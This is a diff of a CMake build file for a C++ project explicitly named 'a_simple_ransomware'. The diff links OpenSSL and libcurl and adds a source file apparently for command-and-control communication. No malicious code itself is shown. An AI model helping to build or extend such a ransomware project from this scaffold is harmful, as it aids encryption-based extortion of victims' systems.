@@ -1,15 +1,13 @@
 cmake_minimum_required(VERSION 3.10)
-project(MyCppProject)
+project(a_simple_ransomware)
 
-# Imposta il C++ Standard
 set(CMAKE_CXX_STANDARD 17)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 
-# Trova la libreria OpenSSL
+set(CMAKE_TOOLCHAIN_FILE "C:/vcpkg/scripts/buildsystems/vcpkg.cmake")
+
 find_package(OpenSSL REQUIRED)
+find_package(CURL REQUIRED)
 
-# Aggiungi eseguibile
-add_executable(a_simple_ransomware src/main.cpp)
-
-# Linka le librerie OpenSSL
-target_link_libraries(a_simple_ransomware OpenSSL::SSL OpenSSL::Crypto)
+add_executable(a_simple_ransomware src/main.cpp src/C2CCommunication.cpp)
+target_link_libraries(a_simple_ransomware PRIVATE OpenSSL::SSL OpenSSL::Crypto CURL::libcurl)
